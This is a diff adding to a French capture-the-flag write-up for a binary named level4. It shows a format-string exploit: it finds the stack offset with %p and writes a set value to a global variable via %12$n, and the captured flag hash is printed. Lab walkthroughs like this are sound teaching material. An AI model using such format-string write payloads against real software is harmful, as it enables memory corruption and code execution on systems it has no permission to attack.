@@ -58,3 +58,14 @@ python -c 'print("AAAA" + "%p" * 20)' > /tmp/level4
 AAAA0xb7ff26b0 0xbffff754 0xb7fd0ff4 (nil) (nil) 0xbffff718 0x804848d 0xbffff510 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
 
 Nous voyons la presence de 0x41414141 a la 12eme position
+
+python -c 'print("\x10\x98\x04\x08" + "A" * 16930116 + "%12$n")' > /tmp/level4
+cat /tmp/level4 - | ./level4
+
+Cela ne marche pas neanmoins a la place de prmeplir avec 16930116 A (cela est trop grand nous pouvons utiliser le modifier %d pour set la variable a cette valeur tout simplement 
+
+python -c 'print("\x10\x98\x04\x08%16930112d%12$n")' > /tmp/level4 (16930112 car il y a le 4 bits de l'adresse de m)
+cat /tmp/level4 | ./level4
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+Ici nous n'avons pas besoin d'ouvrir un shell car system execute directement la commande que nous voulons.
